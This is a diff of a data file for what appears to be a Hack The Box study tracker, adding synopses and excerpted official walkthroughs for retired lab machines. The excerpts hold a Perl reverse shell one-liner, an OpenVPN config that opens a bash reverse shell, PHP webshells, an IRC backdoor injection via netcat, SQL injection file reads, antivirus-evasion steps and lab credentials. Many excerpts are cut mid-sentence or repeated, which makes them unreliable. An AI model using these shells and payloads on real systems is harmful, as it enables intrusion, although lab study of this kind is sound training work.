+      "Heap-spraying"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bighead",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bighead",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Bighead is an \"Insane\" difficulty windows box which deals with advanced binary exploitation, registry",
     "timeSpentSeconds": 0,
     "createdAt": "2018-11-24T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Bighead is an \"Insane\" difficulty windows box which deals with advanced binary exploitation, registry",
+    "skillsLearned": [
+      "Heap spraying",
+      "Egg hunting technique",
+      "Extracting ADS"
+    ],
+    "officialPdf": "164-BigHead_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBighead is an \"Insane\" difficulty windows box which deals with advanced binary exploitation, registry\n\n### 🎯 Core Skills\n- **Heap spraying**\n- **Egg hunting technique**\n- **Extracting ADS**\n\n### ⚔️ Foothold Vector\n, registry enumeration, code review and NTFS ADS. The source code of the web server is found on github which needs to be analyzed to find an overflow in a HEAD request. It can be exploited using heap spraying and egg hunting which results in a shell. Registry enumeration leads to hex encoded password for nginx which is used to obtain an ssh shell through port forward. On reviewing the PHP code a file vulnerable to LFI is found which is exploited to gain a\n\n### 👑 Privilege Escalation\nshell. The root flag has an ADS which is a keepass database. This is cracked using the key to gain the final flag. Skills Required ● Web server enumeration ● Exploit development ● Reverse Engineering ● Windows enumeration ● Code review Skills Learned ● Heap spraying ● Egg hunting technique ● Extracting ADS"
   },
   {
     "id": "htb-irked",
@@ -9241,15 +11167,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploit-modification",
+      "HTB",
+      "Linux"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/irked",
     "writeupUrl": "https://0xdf.gitlab.io/tags#irked",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Irked is a pretty simple and straight-forward box which requires basic",
     "timeSpentSeconds": 0,
     "createdAt": "2018-11-17T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Irked is a pretty simple and straight-forward box which requires basic",
+    "skillsLearned": [
+      "Exploit modification",
+      "Troubleshooting Metasploit modules",
+      "Linux"
+    ],
+    "officialPdf": "163-Irked_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nIrked is a pretty simple and straight-forward box which requires basic\n\n### 🎯 Core Skills\n- **Exploit modification**\n- **Troubleshooting Metasploit modules**\n- **Linux**\n\n### ⚔️ Foothold Vector\nMETASPLOIT MODULE Metasploit framework has the module \"unreal_ircd_3281_backdoor\" which can be used. Lets start it up and run the module. The module results in a shell right away. The same can be done manually using netcat. We echo in the backdoor command when a connection is established to get it executed. echo 'AB; ping -c2 10.10.12.181' | nc 10.10.10.117 65534\n\n### 👑 Privilege Escalation\nENUMERATING SUID BINARIES On listing the suid files a file /usr/bin/viewuser is noticed which isn't present on Debian by default. find / -type f -perm -4000 2>/dev/null"
   },
   {
     "id": "htb-redcross",
@@ -9260,15 +11196,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Identification-and",
+      "PHP-Session-ID-reuse"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/redcross",
     "writeupUrl": "https://0xdf.gitlab.io/tags#redcross",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "RedCross is a medium difficulty box that features XSS, OS commanding, SQL injection, remote exploitation of a vulnerable application, and privilege escalation via PAM/NSS.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-11-10T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "RedCross is a medium difficulty box that features XSS, OS commanding, SQL injection, remote exploitation of a vulnerable application, and privilege escalation via PAM/NSS.",
+    "skillsLearned": [
+      "Authentication bypass technique via",
+      "PHP Session ID reuse",
+      "Identification and"
+    ],
+    "officialPdf": "162-RedCross_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRedCross is a medium difficulty box that features XSS, OS commanding, SQL injection, remote exploitation of a vulnerable application, and privilege escalation via PAM/NSS.\n\n### 🎯 Core Skills\n- **Authentication bypass technique via**\n- **PHP Session ID reuse**\n- **Identification and**\n\n### 👑 Privilege Escalation\nvia PAM/NSS. Skills Required ● Intermediate Linux knowledge ● Basic knowledge of Web enumeration tools ● Knowledge of common web vulnerabilities Skills Learned ● Authentication bypass technique via PHP Session ID reuse ● Identification and exploitation of a vulnerable application ● Privilege escalation via PAM/NSS"
   },
   {
     "id": "htb-vault",
@@ -9279,15 +11225,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "SSH-port-forwarding",
+      "configuration-files"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/vault",
     "writeupUrl": "https://0xdf.gitlab.io/tags#vault",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Vault is medium to hard difficulty machine, which requires bypassing host and file upload restrictions, tunneling, creating malicious OpenVPN configuration files and PGP decryption.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-11-03T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Vault is medium to hard difficulty machine, which requires bypassing host and file upload restrictions, tunneling, creating malicious OpenVPN configuration files and PGP decryption.",
+    "skillsLearned": [
+      "Creating malicious OpenVPN",
+      "configuration files",
+      "SSH port forwarding",
+      "Bypassing port restrictions using ncat"
+    ],
+    "officialPdf": "161-Vault_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nVault is medium to hard difficulty machine, which requires bypassing host and file upload restrictions, tunneling, creating malicious OpenVPN configuration files and PGP decryption.\n\n### 🎯 Core Skills\n- **Creating malicious OpenVPN**\n- **configuration files**\n- **SSH port forwarding**\n- **Bypassing port restrictions using ncat**\n\n### ⚔️ Foothold Vector\n(192.168.122.1) Bypassing File Upload Restriction The \"Design Settings\" page provides functionality to upload a logo, although there are restrictions on the file extension. However, php5 extensions are permitted. After uploading and executing a php reverse shell (e.g. in Kali /usr/share/webshells/php/php-reverse-shell.php), a foothold on \"Ubuntu\" (192.168.122.1) is received. There is a user \"dave\", and enumeration reveals SSH credentials and other useful information on their desktop. SSH: dave:Dav3therav3123 Key: itscominghome Server: 192.168.122.4\n\n### 👑 Privilege Escalation\n@DNS, and the user flag on Dave's desktop can be captured. remote 192.168.122.1 ifconfig 10.200.0.2 10.200.0.1 dev tun script-security 2 nobind up \"/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/1337 0<&1 2>&1&'\" SSH credentials to access 192.168.122.4 are found in Dave's home directory. Dave is able to run any command as root using sudo. dave:dav3gerous567"
   },
   {
     "id": "htb-curling",
@@ -9298,15 +11255,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Analyzing-hex-dump",
+      "Curl-usage",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/curling",
     "writeupUrl": "https://0xdf.gitlab.io/tags#curling",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Curling is an Easy difficulty Linux box which requires a fair amount of",
     "timeSpentSeconds": 0,
     "createdAt": "2018-10-27T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Curling is an Easy difficulty Linux box which requires a fair amount of",
+    "skillsLearned": [
+      "Analyzing hex dump",
+      "Curl usage"
+    ],
+    "officialPdf": "160-Curling_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCurling is an Easy difficulty Linux box which requires a fair amount of\n\n### 🎯 Core Skills\n- **Analyzing hex dump**\n- **Curl usage**\n\n### ⚔️ Foothold Vector\nLogging in gives us access to the control panel. On the right side under Configuration click on Templates > Templates > Protostar. Now click on a php file like index.php and add command execution. system($_REQUEST['pwn']);\n\n### 👑 Privilege Escalation\n. The username can be download through a post on the CMS which allows a login. Modifying the php template gives a shell. Finding a hex dump and reversing it gives a user shell. On enumerating running processes a cron is discovered which can be exploited for root. Skills Required ● Enumeration Skills Learned ● Analyzing hex dump ● Curl usage"
   },
   {
     "id": "htb-zipper",
@@ -9317,15 +11283,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Zabbix-API"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/zipper",
     "writeupUrl": "https://0xdf.gitlab.io/tags#zipper",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Zipper is a medium difficulty machine that highlights how privileged API access can be leveraged to gain RCE, and the risk of unauthenticated agent access. It also provides an interesting challenge in terms of overcoming command processing timeouts, and also highlights the danger",
     "timeSpentSeconds": 0,
     "createdAt": "2018-10-20T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Zipper is a medium difficulty machine that highlights how privileged API access can be leveraged to gain RCE, and the risk of unauthenticated agent access. It also provides an interesting challenge in terms of overcoming command processing timeouts, and also highlights the dangers of not specifying absolute paths in privileged admin scripts/binaries.",
+    "skillsLearned": [
+      "Zabbix API"
+    ],
+    "officialPdf": "159-Zipper_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nZipper is a medium difficulty machine that highlights how privileged API access can be leveraged to gain RCE, and the risk of unauthenticated agent access. It also provides an interesting challenge in terms of overcoming command processing timeouts, and also highlights the dangers of not specifying absolute paths in privileged admin scripts/binaries.\n\n### 🎯 Core Skills\n- **Zabbix API**\n\n### ⚔️ Foothold Vector\nThe exploit is copied/downloaded, and the Zabbix\n\n### 👑 Privilege Escalation\n, hostid, login and password are entered (see Appendix A). https://www.exploit-db.com/exploits/39937 The exploit works very well, and the presence of \".dockerenv\" reveals that the foothold is within a Docker container. In order to upgrade to a proper shell, the following Perl \"one-liner\" is issued. $ python zabbix_api_pwn.py [zabbix_cmd]>>: perl -e 'use Socket;$i=\"10.10.14.2\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));i f(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");op en(STDERR,\">&S\");exec(\"/bin/sh -i\");};' &"
   },
   {
     "id": "htb-frolic",
@@ -9336,15 +11309,30 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Cracking-password",
+      "HTB",
+      "binaries-with-ret2libc",
+      "protected-ZIP-files"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/frolic",
     "writeupUrl": "https://0xdf.gitlab.io/tags#frolic",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Frolic is not overly challenging, however a great deal of",
     "timeSpentSeconds": 0,
     "createdAt": "2018-10-13T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Frolic is not overly challenging, however a great deal of",
+    "skillsLearned": [
+      "Identifying esoteric languages",
+      "Identifying various encoding methods",
+      "Cracking password",
+      "protected ZIP files",
+      "Identifying vulnerable services",
+      "Escalating privileges through ROP SUID",
+      "binaries with ret2libc"
+    ],
+    "officialPdf": "158-Frolic_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFrolic is not overly challenging, however a great deal of\n\n### 🎯 Core Skills\n- **Identifying esoteric languages**\n- **Identifying various encoding methods**\n- **Cracking password**\n- **protected ZIP files**\n- **Identifying vulnerable services**\n- **Escalating privileges through ROP SUID**\n- **binaries with ret2libc**\n\n### ⚔️ Foothold Vector\nchallenge, and is a great learning experience for beginners. Skills Required ● Intermediate/advanced Linux knowledge ● Basic understanding of return-oriented programming and the ret2libc method Skills Learned ● Identifying esoteric languages ● Identifying various encoding methods ● Cracking password-protected ZIP files ● Identifying vulnerable services ● Escalating privileges through ROP SUID binaries with ret2libc\n\n### 👑 Privilege Escalation\nfeatures an easy difficulty return-oriented programming (ROP) exploitation challenge, and is a great learning experience for beginners. Skills Required ● Intermediate/advanced Linux knowledge ● Basic understanding of return-oriented programming and the ret2libc method Skills Learned ● Identifying esoteric languages ● Identifying various encoding methods ● Cracking password-protected ZIP files ● Identifying vulnerable services ● Escalating privileges through ROP SUID binaries with ret2libc"
   },
   {
     "id": "htb-ethereal",
@@ -9355,15 +11343,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "DNS-data-exfiltration",
+      "HTB",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ethereal",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ethereal",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Ethereal is an \"insane\" difficulty machine, which showcases how DNS can be used to exfiltrate information from a system, and is applicable to many externally facing applications. It also features a very restrictive environment, which is made more hospitable by the use of the Open",
     "timeSpentSeconds": 0,
     "createdAt": "2018-10-06T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Ethereal is an \"insane\" difficulty machine, which showcases how DNS can be used to exfiltrate information from a system, and is applicable to many externally facing applications. It also features a very restrictive environment, which is made more hospitable by the use of the OpenSSL \"LOLBIN\". It highlights how malicious shortcut files can be used to move laterally and vertically within a system or network. Finally, it shows how an attacker would be able use trusted certificates to defeat a stringent application whitelisting configuration.",
+    "skillsLearned": [
+      "DNS data exfiltration",
+      "OpenSSL egress check, reverse shell,",
+      "digest generation, and file transfer",
+      "techniques",
+      "Malicious shortcut testing and creation",
+      "Malicious MSI testing and creation"
+    ],
+    "officialPdf": "157-Ethereal_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nEthereal is an \"insane\" difficulty machine, which showcases how DNS can be used to exfiltrate information from a system, and is applicable to many externally facing applications. It also features a very restrictive environment, which is made more hospitable by the use of the OpenSSL \"LOLBIN\". It highlights how malicious shortcut files can be used to move laterally and vertically within a system or network. Finally, it shows how an attacker would be able use trusted certificates to defeat a stringent application whitelisting configuration.\n\n### 🎯 Core Skills\n- **DNS data exfiltration**\n- **OpenSSL egress check, reverse shell,**\n- **digest generation, and file transfer**\n- **techniques**\n- **Malicious shortcut testing and creation**\n- **Malicious MSI testing and creation**\n\n### ⚔️ Foothold Vector\nEgress check The blog post below by Andreas Hontzia (@honze) shows how OpenSSL can be used to gain a reverse shell from Linux. https://medium.com/@honze_net/openssl-reverse-shell-with-certificate-pinning-e0955c37b4a7 Perhaps the classic telnet 10.10.10.10 80 | cmd.exe | telnet 10.10.10.10 443 redirection technique can be applied to OpenSSL on Windows? This seems likely, but before a reverse shell is attempted, it is necessary to check which ports allow outbound traffic. OpenSSL can be used as a port scanner. tshark is configured to listen on the first 1000 ports, and a simple FOR loop is executed. tshark -i tun0 host 10.10.10.106 and portrange 1-1000 127.0.0.\n\n### 👑 Privilege Escalation\n/.pbox.dat ./pbox Access is gained with a password of \"password\"."
   },
   {
     "id": "htb-access",
@@ -9374,15 +11375,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Basic-Windows-knowledge",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/access",
     "writeupUrl": "https://0xdf.gitlab.io/tags#access",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Access is an \"easy\" difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares often lead to getting a foothold or lateral movement.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-09-29T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Access is an \"easy\" difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.",
+    "skillsLearned": [
+      "Basic Windows knowledge"
+    ],
+    "officialPdf": "156-Access_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAccess is an \"easy\" difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.\n\n### 🎯 Core Skills\n- **Basic Windows knowledge**\n\n### ⚔️ Foothold Vector\nor lateral movement. It teaches techniques for identifying and exploiting saved credentials. Skills Required ● Basic Windows knowledge Skills Learned ● Enumeration of Access Databases and Outlook Personal Archives ● Identification of saved credentials ● DPAPI credential extraction\n\n### 👑 Privilege Escalation\n): anonymous Password: anonymous ftp> dir ftp> cd Backups ftp> dir ftp> type binary ftp> get backup.mdb ftp> cd .. ftp> cd Engineer ftp> dir ftp> get \"Access Control.zip\""
   },
   {
     "id": "htb-carrier",
@@ -9393,15 +11401,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "SNMP"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/carrier",
     "writeupUrl": "https://0xdf.gitlab.io/tags#carrier",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Carrier is a medium machine with a unique privilege escalation that involves BGP hijacking. The initial access is pretty straight forward but with a little twist to it.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-09-22T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Carrier is a medium machine with a unique privilege escalation that involves BGP hijacking. The initial access is pretty straight forward but with a little twist to it.",
+    "skillsLearned": [
+      "SNMP"
+    ],
+    "officialPdf": "155-Carrier_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCarrier is a medium machine with a unique privilege escalation that involves BGP hijacking. The initial access is pretty straight forward but with a little twist to it.\n\n### 🎯 Core Skills\n- **SNMP**\n\n### ⚔️ Foothold Vector\nis pretty straight forward but with a little twist to it. Skills Required ● Intermediate knowledge of networking Skills Learned ● SNMP enumeration ● Command injection ● BGP hijacking\n\n### 👑 Privilege Escalation\nthat involves BGP hijacking. The initial access is pretty straight forward but with a little twist to it. Skills Required ● Intermediate knowledge of networking Skills Learned ● SNMP enumeration ● Command injection ● BGP hijacking"
   },
   {
     "id": "htb-ypuffy",
@@ -9412,15 +11427,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "CVE-2018-14665",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/ypuffy",
     "writeupUrl": "https://0xdf.gitlab.io/tags#ypuffy",
-    "hint": "Hack The Box Other machine. Rated Medium difficulty.",
+    "hint": "Ypuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas command.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-09-15T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Ypuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas command. An additional privilege escalation involving Xorg is also possible.",
+    "skillsLearned": [
+      "Crafting custom LDAP queries /",
+      "manually finding the RootDSE"
+    ],
+    "officialPdf": "154-Ypuffy_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nYpuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas command. An additional privilege escalation involving Xorg is also possible.\n\n### 🎯 Core Skills\n- **Crafting custom LDAP queries /**\n- **manually finding the RootDSE**\n\n### 🛡️ Associated CVEs\n`CVE-2018-14665`\n\n### 👑 Privilege Escalation\n, via the OpenBSD doas command. An additional privilege escalation involving Xorg is also possible. Skills Required ● Basic knowledge of LDAP and SMB enumeration tools ● Basic knowledge of Linux/BSD Skills Learned ● Crafting custom LDAP queries / manually finding the RootDSE ● Enumeration and exploitation of SSH CA authentication configurations"
   },
   {
     "id": "htb-giddy",
@@ -9431,15 +11454,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Windows-Registry"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/giddy",
     "writeupUrl": "https://0xdf.gitlab.io/tags#giddy",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Giddy is a medium difficulty machine, which highlights how low privileged SQL Server logins can be used to compromise the underlying SQL Server service account. This is an issue in many environments, and depending on the configuration, the service account may have elevated privil",
     "timeSpentSeconds": 0,
     "createdAt": "2018-09-08T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Giddy is a medium difficulty machine, which highlights how low privileged SQL Server logins can be used to compromise the underlying SQL Server service account. This is an issue in many environments, and depending on the configuration, the service account may have elevated privileges across the domain. It also features Windows registry",
+    "skillsLearned": [
+      "Using xp_dirtree to leak the SQL Server",
+      "service account NetNTLM hash",
+      "Identification of installed programs via",
+      "Windows Registry"
+    ],
+    "officialPdf": "153-Giddy_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nGiddy is a medium difficulty machine, which highlights how low privileged SQL Server logins can be used to compromise the underlying SQL Server service account. This is an issue in many environments, and depending on the configuration, the service account may have elevated privileges across the domain. It also features Windows registry\n\n### 🎯 Core Skills\n- **Using xp_dirtree to leak the SQL Server**\n- **service account NetNTLM hash**\n- **Identification of installed programs via**\n- **Windows Registry**\n\n### ⚔️ Foothold Vector\n@paranoidninja has made \"prometheus\", a simple C++ TCP reverse shell, which will be used to create the malicious taskkill.exe. The function names have been changed and comments removed in order to reduce the likelihood of signature-based antivirus detection (see Appendix A). https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp Mingw-w64 is installed and the binary is compiled. apt-get install g++-mingw-w64 i686-w64-mingw32-g++ prometheus.cpp -o taskkill.\n\n### 👑 Privilege Escalation\nIdentification of vulnerability searchsploit reveals that Ubiquiti UniFi Video suffers from a privilege escalation vulnerability. The exploit is copied to the current working directory for further inspection. searchsploit unifi video -m 43390 The issue is that Ubiquiti UniFi Video runs in the context of the \"NT AUTHORITY/SYSTEM\", and upon starting or stopping the service, it will attempt to execute the taskkill.exe binary from the location \"C:\\ProgramData\\unifi-video\\\", which is writable by all users. It is confirmed that the location is writable, and the service is stoppable/startable. icacls unifi-video Get-Service \"Ubiquiti UniFi Video\" | fl *"
   },
   {
     "id": "htb-oz",
@@ -9450,15 +11483,33 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "PBKDF2",
+      "SHA256-hashes",
+      "Server",
+      "Side-Template-Injection",
+      "options"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/oz",
     "writeupUrl": "https://0xdf.gitlab.io/tags#oz",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Oz is a hard to insane difficulty machine which teaches about web application",
     "timeSpentSeconds": 0,
     "createdAt": "2018-09-01T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Oz is a hard to insane difficulty machine which teaches about web application",
+    "skillsLearned": [
+      "Gain familiarity with WFuzz advanced",
+      "options",
+      "Accessing file system via SQL injection",
+      "Extraction and cracking of",
+      "PBKDF2",
+      "SHA256 hashes",
+      "Server",
+      "Side Template Injection"
+    ],
+    "officialPdf": "152-Oz_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOz is a hard to insane difficulty machine which teaches about web application\n\n### 🎯 Core Skills\n- **Gain familiarity with WFuzz advanced**\n- **options**\n- **Accessing file system via SQL injection**\n- **Extraction and cracking of**\n- **PBKDF2**\n- **SHA256 hashes**\n- **Server**\n- **Side Template Injection**\n\n### ⚔️ Foothold Vector\nSQL Injection Various SQL injection payloads are attempted and the famous ' OR '1'='1 returns \"dorthi\", which confirms that there is a SQL injection vulnerability. The database version and name are queried. It is also worth checking if it is possible to read from the file system. load_file('/etc/passwd') doesn't return any output, but providing hex-encoded file paths is successful. A programming/scripting language of choice can be used to generate the hex-encoded values printf 0x; printf \"/etc/passwd\" | xxd -ps -c 200 | tr -d '\\n'; echo"
   },
   {
     "id": "htb-secnotes",
@@ -9469,15 +11520,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "CSRF-payload-creation",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/secnotes",
     "writeupUrl": "https://0xdf.gitlab.io/tags#secnotes",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "SecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection and insufficient validation of user input. It also teaches about Windows Subsystem for Linux",
     "timeSpentSeconds": 0,
     "createdAt": "2018-08-25T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "SecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection and insufficient validation of user input. It also teaches about Windows Subsystem for Linux",
+    "skillsLearned": [
+      "CSRF payload creation",
+      "SQLi authentication bypass",
+      "Windows Subsystem for Linux"
+    ],
+    "officialPdf": "151-SecNotes_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection and insufficient validation of user input. It also teaches about Windows Subsystem for Linux\n\n### 🎯 Core Skills\n- **CSRF payload creation**\n- **SQLi authentication bypass**\n- **Windows Subsystem for Linux**\n\n### ⚔️ Foothold Vector\nSMB Share Access The details below are used to access the \"new-site\" share, which seems to be the IIS web\n\n### 👑 Privilege Escalation\n(wwwroot). \\\\secnotes.htb\\new-site tyler / 92g!mA8BGjOirkL%OG*& Write access is possible, and a minimal PHP webshell with the contents below is uploaded (smbclient command: put SCAVEFVR.php). <?php echo shell_exec($_GET[\"c\"]); ?> Command execution as SECNOTES\\tyler is achieved."
   },
   {
     "id": "htb-dab",
@@ -9488,15 +11548,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2018-15473",
+      "HTB",
+      "Wfuzz-advanced"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/dab",
     "writeupUrl": "https://0xdf.gitlab.io/tags#dab",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Dab is a challenging machine, that features an interesting",
     "timeSpentSeconds": 0,
     "createdAt": "2018-08-18T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Dab is a challenging machine, that features an interesting",
+    "skillsLearned": [
+      "Wfuzz advanced"
+    ],
+    "officialPdf": "150-Dab_HTB_Official_writeup_Tamarisk.pdf",
